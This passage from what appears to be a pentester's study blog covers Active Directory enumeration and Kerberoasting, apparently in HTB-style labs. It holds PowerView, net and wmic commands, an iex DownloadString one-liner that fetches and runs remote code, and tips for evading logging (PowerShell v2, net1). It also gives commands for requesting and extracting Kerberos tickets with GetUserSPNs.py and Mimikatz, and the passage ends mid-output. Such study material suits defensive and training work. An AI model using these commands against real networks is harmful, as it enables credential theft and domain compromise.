description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</code></p><p><strong><strong><strong>Recursive Group Membership</strong></strong></strong></p><p><code>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code> - retrieve group-specific information and recurse which means if it finds any groups that are part of the target group (<strong><strong><strong>nested group membership</strong></strong></strong>) to list out the members of those groups.</p><p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Trust Enumeration.</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><p><code>Get-DomainTrustMapping</code> test for local admin access on either the current machine or the remote one.</p><p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Testing for Local Admin Access</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p><p><code>Test-AdminAccess -ComputerName ACADEMY-EA-MS01</code></p><p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Users with SPN Set</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><p><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></p><h2 id="Shares"><a href="#Shares" class="headerlink" title="Shares"></a>Shares</h2><p>Allows users on the domain to quickly access info relevant to their daily roles and share content with their organization. </p><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><p> A tool that helps in acquiring credentials or other sensitive data in AD, works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.</p><h2 id="Living-off-the-Land"><a href="#Living-off-the-Land" class="headerlink" title="Living off the Land"></a>Living off the Land</h2><p>Discussion on Techniques for utilizing native Windows tools to perform our enumeration is considered a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network.</p><p>Most enterprise environments have network monitoring and logging, including IDS&#x2F;IPS, firewalls and passive sensors and tools on top of their host-based defences Windows Defender or enterprise EDR.</p><h3 id="Env-Enumeration-Host-Network-Recon"><a href="#Env-Enumeration-Host-Network-Recon" class="headerlink" title="Env Enumeration Host &amp; Network Recon"></a>Env Enumeration Host &amp; Network Recon</h3><table><thead><tr><th>Command</th><th>Result</th></tr></thead><tbody><tr><td>hostname</td><td>Prints the PC‚Äôs Name</td></tr><tr><td>[System.Environment]::OSVersion.Version</td><td>Prints out the OS version and revision level</td></tr><tr><td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td><td>Prints the patches and hotfixes applied to the host</td></tr><tr><td>ipconfig &#x2F;all</td><td>Prints out network adapter state and configurations</td></tr><tr><td>set %USERDOMAIN%</td><td>Displays the domain name to which the host belongs (ran from CMD-prompt)</td></tr><tr><td>set %logonserver%</td><td>Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)</td></tr></tbody></table><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><p>It provides an extensive framework for administering all facets of Windows systems and AD Environments, can be used to dig deep into systems and can be used on engagements to recon the host and network and send and receive files.</p><table><thead><tr><th>Cmd-Let</th><th>Description</th></tr></thead><tbody><tr><td>Get-Module</td><td>Lists available modules loaded for use.</td></tr><tr><td>Get-ExecutionPolicy -List</td><td>Will print the¬†<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2</a>¬†settings for each scope on a host.</td></tr><tr><td>Set-ExecutionPolicy Bypass -Scope Process</td><td>This will change the policy for our current process using the¬†-Scope¬†parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won‚Äôt be making a permanent change to the victim host.</td></tr><tr><td>Get-Content C:\Users&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</td><td>With this string, we can get the specified user‚Äôs PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.</td></tr><tr><td>Get-ChildItem Env:</td><td>ft Key, Value</td></tr><tr><td>powershell -nop -c ‚Äúiex(New-Object Net.WebClient).DownloadString(‚ÄòURL to download the file from‚Äô); <follow-on commands>‚Äú</td><td>This is a quick and easy way to download a file from the web using PowerShell and call it from memory.</td></tr></tbody></table><h2 id="OPSec-Tactics"><a href="#OPSec-Tactics" class="headerlink" title="OPSec Tactics"></a>OPSec Tactics</h2><p>A few Operational security tactics that defenders are unaware of are that several versions of Powershell often exist on a host. If not uninstalled, they can still be used.</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><blockquote><p>Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders‚Äô radar while utilizing resources built into the hosts to our advantage.</p></blockquote><h3 id="Checking-Defenses"><a href="#Checking-Defenses" class="headerlink" title="Checking Defenses."></a>Checking Defenses.</h3><p>These few commands will utilize the <a href="https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts">netsh</a>¬†and¬†<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query">sc</a> to help get an understanding of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.</p><p>Firewall check - <code>netsh advfirewall show allprofiles</code></p><p>Defender check cmd - <code>sc query windefend</code></p><p>Checking the status and configuration settings - <code>Get-MpComputerStatus</code></p><h2 id="Am-I-Alone"><a href="#Am-I-Alone" class="headerlink" title="Am I Alone?"></a>Am I Alone?</h2><p>When landing on a host for the first time, it‚Äôs important to check and see if you are the only one logged in since if you take certain actions from a host someone else is logged on, there is potential for them to identify you.</p><p>If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.</p><h3 id="Network-Enumeration"><a href="#Network-Enumeration" class="headerlink" title="Network Enumeration"></a>Network Enumeration</h3><table><thead><tr><th>Networking Commands</th><th>Description</th></tr></thead><tbody><tr><td>arp -a</td><td>Lists all known hosts stored in the arp table.</td></tr><tr><td>ipconfig &#x2F;all</td><td>Prints out adapter settings for the host. We can figure out the network segment from here.</td></tr><tr><td>route print</td><td>Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.</td></tr><tr><td>netsh advfirewall shows state</td><td>Displays the status of the host‚Äôs firewall. We can determine if it is active and filtering traffic.</td></tr></tbody></table><h3 id="Windows-Management-Instrumentation-WMI"><a href="#Windows-Management-Instrumentation-WMI" class="headerlink" title="Windows Management Instrumentation (WMI)"></a>Windows Management Instrumentation (WMI)</h3><p> This scripting engine is used within Windows enterprises to retrieve info and run admin tasks on local and remote hosts.</p><p><strong>Quick WMI checks</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td><td>Prints the patch level and description of the Hotfixes applied</td></tr><tr><td>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles &#x2F;format:List</td><td>Displays basic host information to include any attributes within the list</td></tr><tr><td>wmic process list &#x2F;format:list</td><td>A listing of all processes on host</td></tr><tr><td>wmic ntdomain list &#x2F;format:list</td><td>Displays information about the Domain and Domain Controllers</td></tr><tr><td>wmic useraccount list &#x2F;format:list</td><td>Displays information about all local accounts and any domain accounts that have logged into the device</td></tr><tr><td>wmic group list &#x2F;format:list</td><td>Information about all local groups</td></tr><tr><td>wmic sysaccount list &#x2F;format:list</td><td>Dumps information about any system accounts that are being used as service accounts.</td></tr></tbody></table><p>This¬†<a href="https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4">cheatsheet</a> has some useful commands for querying host and domain info using wmic.</p><h3 id="Net-Commands"><a href="#Net-Commands" class="headerlink" title="Net Commands"></a>Net Commands</h3><p>Are useful when enumerating information from the domain, these commands can be used to query the [localhost] and remote hosts.</p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>net accounts</td><td>Information about password requirements</td></tr><tr><td>net accounts &#x2F;domain</td><td>Password and lockout policy</td></tr><tr><td>net group &#x2F;domain</td><td>Information about domain groups</td></tr><tr><td>net group ‚ÄúDomain Admins‚Äù &#x2F;domain</td><td>List users with domain admin privileges</td></tr><tr><td>net group ‚Äúdomain computers‚Äù &#x2F;domain</td><td>List of PCs connected to the domain</td></tr><tr><td>net group ‚ÄúDomain Controllers‚Äù &#x2F;domain</td><td>List PC accounts of domains controllers</td></tr><tr><td>net group <domain_group_name> &#x2F;domain</td><td>User that belongs to the group</td></tr><tr><td>net groups &#x2F;domain</td><td>List of domain groups</td></tr><tr><td>net localgroup</td><td>All available groups</td></tr><tr><td>net localgroup administrators &#x2F;domain</td><td>List users that belong to the administrators group inside the domain (the group¬†Domain Admins¬†is included here by default)</td></tr><tr><td>net localgroup Administrators</td><td>Information about a group (admins)</td></tr><tr><td>net localgroup administrators [username] &#x2F;add</td><td>Add user to administrators</td></tr><tr><td>net share</td><td>Check current shares</td></tr><tr><td>net user <ACCOUNT_NAME> &#x2F;domain</td><td>Get information about a user within the domain</td></tr><tr><td>net user &#x2F;domain</td><td>List all users of the domain</td></tr><tr><td>net user %username%</td><td>Information about the current user</td></tr><tr><td>net use x: \computer\share</td><td>Mount the share locally</td></tr><tr><td>net view</td><td>Get a list of computers</td></tr><tr><td>net view &#x2F;all &#x2F;domain[:domainname]</td><td>Shares on the domains</td></tr><tr><td>net view \computer &#x2F;ALL</td><td>List shares of a computer</td></tr><tr><td>net view &#x2F;domain</td><td>List of PCs of the domain</td></tr></tbody></table><h2 id="Net-Command-Tip"><a href="#Net-Command-Tip" class="headerlink" title="Net Command Tip."></a>Net Command Tip.</h2><p>If you are in an environment where network defenders are actively logging&#x2F;looking for any commands out of the normal you can try typing <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>net1</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> instead of the <strong><strong><strong><strong>net</strong></strong></strong></strong> to work out using the net command.</p><h2 id="Dsquery"><a href="#Dsquery" class="headerlink" title="Dsquery"></a>Dsquery</h2><p>A command-line tool that can be used to find Active Directory objects, the queries run with dsquery can be replicated with Bloodhound and Powerview, but one may not have access to those tools.</p><p><strong><strong>Dsquery</strong></strong> will exist on any host with the <code>Active Directory Domain Services Role</code> installed, and the¬†<code>dsquery</code>¬†DLL exists on all modern Windows systems by default now and can be found at¬†<code>C:\Windows\System32\dsquery.dll</code></p><p>A long read but worthy to check up on those commands one might not remember ‚Ä¶</p>]]></content>
    
    
    <summary type="html">Active Directory credential enumeration</summary>
    
    
    
    <category term="Writeups" scheme="https://malw0re.github.io/categories/Writeups/"/>
    
    
    <category term="Active-Directory" scheme="https://malw0re.github.io/tags/Active-Directory/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos</title>
    <link href="https://malw0re.github.io/2023/07/13/kerberos-101/"/>
    <id>https://malw0re.github.io/2023/07/13/kerberos-101/</id>
    <published>2023-07-13T00:00:00.000Z</published>
    <updated>2025-07-09T18:12:01.002Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://redfoxsec.com/wp-content/uploads/2023/03/attacking-kerberos-part-2-thumbnail.png"></p><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>The Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.</p><p><em>NB</em> [<strong><strong>kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network</strong>]</strong></p><p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*J6UHDf5fnbzdKTPawNq3UA.png"></p><h3 id="How-Kerb-Auth-works"><a href="#How-Kerb-Auth-works" class="headerlink" title="How Kerb Auth works!"></a>How Kerb Auth works!</h3><p>In every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.</p><p><img src="https://1.bp.blogspot.com/-XHZj0n9oH_g/XrHWMs_s-uI/AAAAAAAAj2E/oxSrDD2wvOEMv-a-nTHhQD2jc-3KMULYgCLcBGAsYHQ/s1600/1.png" alt="1.webp"></p><p>Kerberos uses symmetric cryptography for encryption and decryption.</p><p>For explanation purposes, we use three colours to distinguish Hashes:</p><ul><li><strong>BLUE _KEY</strong>: User NTLM HASH</li><li><strong>YELLOW_KEY</strong>: Krbtgt NTLM HASH</li><li><strong>RED_KEY:</strong>¬†Service NTLM HASH</li></ul><p><strong>Step 1:</strong>¬†By sending the request message to KDC, the client initializes communication as:</p><p><em><strong>KRB_AS_REQ contains the following:</strong></em></p><ul><li>The username of the client is to be authenticated.</li><li><em>The service¬†<strong>SPN (SERVICE PRINCIPAL NAME)</strong>¬†linked with the Krbtgt account</em></li><li><em>An encrypted timestamp (Locked with User Hash: Blue Key)</em></li></ul><p>The entire message is encrypted using the User NTLM hash (<strong>Locked with BLUE KEY</strong>) to authenticate the user and prevent replay attacks.</p><p><strong>Step 2:</strong>¬†The KDC uses a database consisting of Users&#x2F;Krbtgt&#x2F;Services hashes to decrypt a message (<strong>Unlock with BLUE KEY</strong>) that authenticates user identification.</p><p>Then KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) &amp; some Encrypted Message using User Hash.</p><p><em><strong>KRB_AS_REP contains the following:</strong></em></p><ul><li><em><strong>Username</strong></em></li><li><em>Some¬†encrypted data, (Locked with User Hash: Blue Key) that contains:</em></li><li><em>Session key</em></li><li><em>The expiration date¬†of TGT</em></li><li><em><strong>TGT</strong>, (Locked with Krbtgt Hash: Yellow Key) which contains:</em></li><li><em>Username</em></li><li><em>Session key</em></li><li><em>The expiration date¬†of TGT</em></li><li><em>PAC¬†with user privileges, signed by KDC</em></li></ul><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA&#x2F;s16000&#x2F;2.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p><strong>Step 3:</strong>¬†The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.</p><p><em><strong>KRB_TGS_REQ</strong>¬†contains:</em></p><ul><li><em>Encrypted data¬†with the session key</em></li><li><em>Username</em></li><li><em>Timestamp</em></li><li><em>TGT</em></li><li><em>SPN¬†of requested service e.g. SQL service</em></li></ul><p><strong>Step 4:</strong>¬†The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash¬†<strong>(Locked with Red Key)</strong>¬†&amp; Some Encrypted Message using User Hash.</p><p><em><strong>KRB_TGS_REP¬†contains:</strong></em></p><ul><li><em>Username</em></li><li><em>Encrypted data¬†with the session key:</em></li><li><em>Service session key</em></li><li><em>The expiration date¬†of TGS</em></li><li><em><strong>TGS</strong>, (Service Hash: RED Key) which contains:</em></li><li><em>Service session key</em></li><li><em>Username</em></li><li><em>The expiration date¬†of TGS</em></li><li><em>PAC¬†with user privileges, signed by KDC</em></li></ul><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw&#x2F;s16000&#x2F;3.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p><strong>Step 5:</strong>¬†The user sends the copy of TGS to the Application Server,</p><p><em><strong>KRB_AP_REQ¬†contains:</strong></em></p><ul><li><em>TGS</em></li><li><em>Encrypted data¬†with the service session key:</em></li><li><em>Username</em></li><li><em>Timestamp, to avoid replay attacks</em></li></ul><p><strong>Step 6:</strong>¬†The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.</p><p><strong>Step 7:</strong>¬†¬†KDC verifies PAC (Optional)</p><p><strong>Step 8:</strong>¬† Allow the user to access the service for a specific time.</p><h2 id="SPNs"><a href="#SPNs" class="headerlink" title="SPNs"></a>SPNs</h2><p>The Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.</p><p><strong>Important Points</strong></p><ul><li>If you install multiple instances of a service on computers throughout a forest, each instance must have its SPN.</li><li>Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account.</li><li>A given SPN can be registered on only one account.</li><li>An SPN must be unique in the forest in which it is registered.</li><li>If it is not unique, authentication will fail.</li></ul><h3 id="SPNS-syntax"><a href="#SPNS-syntax" class="headerlink" title="SPNS syntax"></a>SPNS syntax</h3><p><strong>The SPN syntax has four elements</strong></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ&#x2F;s16000&#x2F;5.png?w&#x3D;640&amp;ssl&#x3D;1"></p><h3 id="Type-of-SPN"><a href="#Type-of-SPN" class="headerlink" title="Type of SPN"></a>Type of SPN</h3><ul><li>Host-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days; hence it is no use in Kerberoasting attacks</li><li>SPNs that have been associated with a domain user account where NTLM hash will be used.</li></ul><h3 id="Linux-Perspective"><a href="#Linux-Perspective" class="headerlink" title="Linux Perspective"></a>Linux Perspective</h3><h4 id="Attack-Procedure"><a href="#Attack-Procedure" class="headerlink" title="Attack Procedure."></a>Attack Procedure.</h4><p>Depending on your positioning a network, Kerberos attacks can be performed in multiple ways.</p><ul><li>From a non-domain joined Linux host using valid domain user credentials.</li><li>From a domain-joined Linux host as root after retrieving the keytab file.</li><li>From a domain-joined Windows, the host is authenticated as a domain user.</li><li>From a domain-joined Windows host with a shell in the context of a domain account.</li><li>As SYSTEM on a domain-joined Windows host.</li><li>From a non-domain joined Windows host using¬†<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)">runas</a>¬†&#x2F;netonly.</li></ul><h4 id="Tools"><a href="#Tools" class="headerlink" title="Tools."></a>Tools.</h4><p>Some tools can be utilized to perform the attack.</p><ul><li>Impacket‚Äôs¬†<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPNs.py</a>¬†from a non-domain joined Linux host.</li><li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li><li>From Windows, utilizing tools such as PowerView,¬†<a href="https://github.com/GhostPack/Rubeus">Rubeus</a>, and other PowerShell scripts.</li></ul><p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>REMEMBER!!!</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><p>Obtaining a TGS ticket via kerberoasting does not guarantee a set of valid credentials and the ticket still must be cracked offline to obtain the cleartext password.</p><p>TGS tickets generally take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using s standard cracking rig.</p><h4 id="The-efficiency-of-Attack"><a href="#The-efficiency-of-Attack" class="headerlink" title="The efficiency of Attack"></a>The efficiency of Attack</h4><p>While it can be a great way to move lateral or escalate privileges in a domain kerberoasting and the presence of SPNs does not guarantee us any level of access.</p><p>We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.</p><p><strong>N&#x2F;B -</strong> When writing a report this finding is termed as high-risk in the first two cases. Third case we may Kerberos and end up unable to crack a single TGS ticket even after mad days of cracking attempts with Hashcat. This would be dropped as a medium-risk issue to make the client aware of the risk of SPNs in the domain.</p><p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>REMEMBER!!!</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><p>A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.</p><h4 id="GetUserSPNs-py"><a href="#GetUserSPNs-py" class="headerlink" title="GetUserSPNs.py"></a>GetUserSPNs.py</h4><p><strong>Listing SPN Accounts.</strong></p><p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend</code></p><h4 id="Requesting-all-TGS-tickets"><a href="#Requesting-all-TGS-tickets" class="headerlink" title="Requesting all TGS tickets.**"></a>Requesting all TGS tickets.**</h4><p>Later on, we can pull all TGS tickets for offline processing using the <strong>-request</strong> flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or Johnny for offline password-cracking attempts.</p><p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request</code></p><h4 id="Requesting-a-Single-TGS-Ticket"><a href="#Requesting-a-Single-TGS-Ticket" class="headerlink" title="Requesting a Single TGS Ticket."></a>Requesting a Single TGS Ticket.</h4><p>Wte can also be more targeted and request just the TGS ticket for a specific account. Let‚Äôs try requesting one for just the¬†required account.</p><p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user</code></p><p>With this ticket in hand, we could attempt, to crack the password offline, if successful we may end up with Domain Admin Rights.</p><p>Saving the Ticket o facilitate offline cracking, it is always good to use the¬†<code>-outputfile</code>¬†flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.</p><p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs</code></p><h3 id="Windows-Perspective"><a href="#Windows-Perspective" class="headerlink" title="Windows Perspective"></a>Windows Perspective</h3><p>Kerberoasting - Semi-Manual Method.</p><h4 id="Enumerating-SPNs-with-setspn-exe"><a href="#Enumerating-SPNs-with-setspn-exe" class="headerlink" title="Enumerating SPNs with setspn.exe"></a>Enumerating SPNs with setspn.exe</h4><p><code>setspn.exe -Q */*</code> running the command you‚Äôll notice many different SPNs returned for the various hosts in the domain.</p><h4 id="Retrieving-All-Tickets-using-setspn-exe"><a href="#Retrieving-All-Tickets-using-setspn-exe" class="headerlink" title="Retrieving All Tickets using setspn.exe"></a>Retrieving All Tickets using setspn.exe</h4><p><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</code></p><p>The above command combines the previous command with¬†<code>setspn.exe</code>¬†to request tickets for all accounts with SPNs set.</p><p>Using <strong><strong><strong><strong><strong><strong><strong><strong><strong>Powershell</strong></strong></strong></strong></strong></strong></strong></strong></strong> we can request TGS tickets for an account in the shell and load them into memory, once they are loaded into memory we can extract them using <strong>Mimkatz.</strong></p><h4 id="Targeting-a-Single-User"><a href="#Targeting-a-Single-User" class="headerlink" title="Targeting a Single User**************"></a>Targeting a Single User**************</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">&quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</span></span><br></pre></td></tr></table></figure><p>Before moving on, let‚Äôs break down the commands above to see what we are doing (which is essentially what is used by¬†<a href="https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1">Rubeus</a>¬†when using the default Kerberoasting method):</p><ul><li>The¬†<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2">Add-Type</a>¬†cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object</li><li>The¬†<code>AssemblyName</code>¬†parameter allows us to specify an assembly that contains types that we are interested in using</li><li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8">System.IdentityModel</a>¬†is a namespace that contains different classes for building security token services</li><li>We‚Äôll then use the¬†<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2">New-Object</a>¬†cmdlet to create an instance of a .NET Framework object</li><li>We‚Äôll use the¬†<a href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8">System.IdentityModel.Tokens</a>¬†namespace with the¬†<a href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8">KerberosRequestorSecurityToken</a>¬†class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session</li></ul><p>We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.</p><p>Now that the tickets are loaded, we can use¬†<code>Mimikatz</code>¬†to extract the ticket(s) from¬†<code>memory</code>.</p><h3 id="Extracting-Tickets-from-Memory-with-Mimikatz"><a href="#Extracting-Tickets-from-Memory-with-Mimikatz" class="headerlink" title="Extracting Tickets from Memory with Mimikatz"></a>Extracting Tickets from Memory with Mimikatz</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Using</span> <span class="string">&#x27;mimikatz.log&#x27;</span> for logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># base64 /out:true</span></span><br><span class="line">isBase64InterceptInput  is 